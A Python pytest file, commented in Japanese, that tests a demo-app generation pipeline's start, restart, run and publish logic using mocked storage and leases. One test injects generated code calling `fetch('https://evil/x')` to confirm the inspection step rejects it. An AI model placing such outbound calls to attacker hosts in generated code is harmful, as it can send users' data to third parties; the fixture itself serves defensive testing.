"""生成オーケストレーション(specs/19 §4.5・ADR-0023)の単体テスト。

runtime(build_frontend)・OS・DB・リースは全てモック。start/restart/run/_publish の分岐を検査。
"""

import contextlib

import pytest

from jetuse_core import builder_generate as bg
from jetuse_core import (
    builder_sessions,
    bundles,
    conversations,
    demo_lease,
    demo_targets,
    demos,
)

PLAN = {"plan_version": 1, "title": "デモ", "description": "説明",
        "capabilities": ["chat"], "screens": [{"id": "s", "title": "画面",
        "blocks": [{"type": "chat", "title": "会話"}]}], "data": {}}


class FakeDemos:
    def __init__(self):
        self.rows = {}
        self.seq = 0

    def create_demo(self, owner, name, description=None, visibility="private",
                    config=None, status=None):
        self.seq += 1
        did = f"d{self.seq}"
        self.rows[did] = {"id": did, "owner_sub": owner, "name": name,
                          "description": description, "visibility": visibility,
                          "status": status or "ready", "config": dict(config or {})}
        return dict(self.rows[did])

    def get_demo(self, did):
        r = self.rows.get(did)
        return dict(r) if r else None

    def set_status(self, did, frm, to):
        r = self.rows.get(did)
        if not r or r["status"] != frm:
            return False
        r["status"] = to
        return True

    def delete_demo(self, owner, did):
        return self.rows.pop(did, None) is not None

    def count_provisioning(self):
        return sum(1 for r in self.rows.values() if r["status"] == "provisioning")

    def merge_config(self, did, patch):
        r = self.rows.get(did)
        if not r:
            return
        for k, v in patch.items():
            if v is None:
                r["config"].pop(k, None)
            else:
                r["config"][k] = v


@pytest.fixture
def fake(monkeypatch):
    fd = FakeDemos()
    for n in ("create_demo", "get_demo", "set_status", "delete_demo",
              "count_provisioning", "merge_config"):
        monkeypatch.setattr(demos, n, getattr(fd, n))

    attached = {}

    def attach_demo(owner, sid, did):
        if attached.get(sid, did) != did:
            return False           # 別 demo が既に付いている = 競合
        attached[sid] = did
        return True

    monkeypatch.setattr(builder_sessions, "attach_demo", attach_demo)

    @contextlib.contextmanager
    def acq_global(name, *, timeout_s=300):
        yield

    @contextlib.contextmanager
    def acq(did, *, timeout_s=300):
        yield demo_lease.DemoLease(demo_id=did, _conn=None)

    monkeypatch.setattr(demo_lease, "acquire_global", acq_global)
    monkeypatch.setattr(demo_lease, "acquire", acq)

    puts = []
    monkeypatch.setattr(bundles, "put_files",
                        lambda ns, bid, files, locator=None: puts.append((ns, bid, files)))
    monkeypatch.setattr(bundles, "delete_bundle",
                        lambda ns, bid, locator=None: None)
    monkeypatch.setattr(demo_targets, "record_target",
                        lambda ns, kind, loc: None)
    usages = []
    monkeypatch.setattr(conversations, "log_usage",
                        lambda owner, cid, model, it, ot: usages.append((owner, model)))

    fd.puts = puts
    fd.attached = attached
    fd.usages = usages
    return fd


def _session(sid="s1", demo_id=None, status="designed", plan=PLAN):
    return {"id": sid, "demo_id": demo_id, "status": status, "plan": plan}


def _ok_runtime(monkeypatch):
    monkeypatch.setattr(bg, "build_frontend", lambda plan, *, model_key: bg.GenerationResult(
        {"App.jsx": b"import {chat} from './api/client.js'"},
        {"index.html": b"<!doctype html>"}, frozenset({"api/client.js"}),
        log="build ok", generator={"model": model_key, "prompt_version": "1",
                                    "opencode_version": "1.17.15"}))


# --- start ---


def test_start_creates_provisioning_and_attaches(fake):
    did = bg.start("owner", _session())
    assert fake.rows[did]["status"] == "provisioning"
    assert fake.rows[did]["config"]["plan"] == PLAN
    assert fake.attached["s1"] == did


def test_start_busy_at_limit(fake, monkeypatch):
    monkeypatch.setattr(demos, "count_provisioning", lambda: 2)
    with pytest.raises(bg.GenerationBusyError):
        bg.start("owner", _session())


def test_start_conflict_deletes_orphan(fake):
    fake.attached["s1"] = "other"        # 別 demo が既に付いている
    with pytest.raises(bg.GenerationConflictError):
        bg.start("owner", _session())
    assert fake.count_provisioning() == 0   # 孤児 provisioning を消した


# --- restart ---


def test_restart_failed_to_provisioning(fake):
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "failed",
                       "config": {"generation": {"error": "x"}}}
    assert bg.restart("d1") == "d1"
    assert fake.rows["d1"]["status"] == "provisioning"
    assert "generation" not in fake.rows["d1"]["config"]  # 前回エラーをクリア


def test_restart_conflict_when_not_failed(fake):
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "ready", "config": {}}
    with pytest.raises(bg.GenerationConflictError):
        bg.restart("d1")


def test_restart_busy_at_limit(fake, monkeypatch):
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "failed", "config": {}}
    monkeypatch.setattr(demos, "count_provisioning", lambda: 2)
    with pytest.raises(bg.GenerationBusyError):
        bg.restart("d1")


# --- run / publish ---


def test_run_happy_publishes_ready(fake, monkeypatch):
    _ok_runtime(monkeypatch)
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "provisioning",
                       "config": {"plan": PLAN}}
    bg.run("d1")
    assert fake.rows["d1"]["status"] == "ready"
    fe = fake.rows["d1"]["config"]["frontend"]
    assert fe["bundle"] and fe["entry"] == "index.html" and fe["generated_at"]  # N6
    assert fe["generator"] == {"model": "gpt-oss-120b", "prompt_version": "1",
                               "opencode_version": "1.17.15"}                    # N6
    assert fake.rows["d1"]["config"]["generation"]["log"] == "build ok"          # N4
    assert fake.usages == [("o", "gpt-oss-120b")]                                # N5
    assert fake.puts and fake.puts[0][2] == {"index.html": b"<!doctype html>"}


def test_run_inspection_violation_fails(fake, monkeypatch):
    monkeypatch.setattr(bg, "build_frontend", lambda plan, *, model_key: bg.GenerationResult(
        {"Home.jsx": b"await fetch('https://evil/x')"},   # 層1 違反
        {"index.html": b"<!doctype html>"}, frozenset()))
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "provisioning",
                       "config": {"plan": PLAN}}
    bg.run("d1")
    assert fake.rows["d1"]["status"] == "failed"
    assert "error" in fake.rows["d1"]["config"]["generation"]
    assert not fake.puts   # 検査不合格は公開しない(put されない)


def test_run_build_error_fails(fake, monkeypatch):
    def boom(plan, *, model_key):
        raise RuntimeError("opencode died")

    monkeypatch.setattr(bg, "build_frontend", boom)
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "provisioning",
                       "config": {"plan": PLAN}}
    bg.run("d1")
    assert fake.rows["d1"]["status"] == "failed"
    assert "opencode died" in fake.rows["d1"]["config"]["generation"]["error"]


def test_run_noop_when_not_provisioning(fake, monkeypatch):
    _ok_runtime(monkeypatch)
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "ready", "config": {}}
    bg.run("d1")
    assert fake.rows["d1"]["status"] == "ready"   # 触らない
    assert not fake.puts


def test_run_missing_plan_fails(fake, monkeypatch):
    _ok_runtime(monkeypatch)
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "provisioning", "config": {}}
    bg.run("d1")
    assert fake.rows["d1"]["status"] == "failed"


def test_publish_discards_when_deleted_midbuild(fake, monkeypatch):
    # build 完了後・publish の status 再確認で deleting を見たら公開しない(孤児を作らない)
    _ok_runtime(monkeypatch)
    fake.rows["d1"] = {"id": "d1", "owner_sub": "o", "status": "provisioning",
                       "config": {"plan": PLAN}}

    real_get = fake.get_demo

    def get_then_delete(did):
        r = real_get(did)
        if r and r["status"] == "provisioning":
            fake.rows[did]["status"] = "deleting"   # publish 直前に DELETE が走った体
        return r

    monkeypatch.setattr(demos, "get_demo", get_then_delete)
    bg.run("d1")
    assert not fake.puts                     # 公開しない
    assert fake.rows["d1"]["status"] == "deleting"
